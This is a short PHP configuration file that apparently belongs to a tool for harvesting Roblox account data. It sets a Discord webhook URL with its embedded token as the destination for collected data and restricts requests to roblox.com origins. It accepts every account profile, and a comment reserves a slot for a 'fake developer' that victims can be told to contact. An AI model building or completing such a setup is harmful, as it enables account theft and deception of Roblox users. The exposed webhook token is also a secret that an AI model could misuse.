<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/817325900579471391/mq0hTuZiH1gIdKm8O8SgRF7Pyu7lpKgOBFYHMJHuZe4l7AJDxt6Kpxx28h3PUVQwpWTU";
    // fake developer for the bot the users may contact
    $discord_contact = "";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>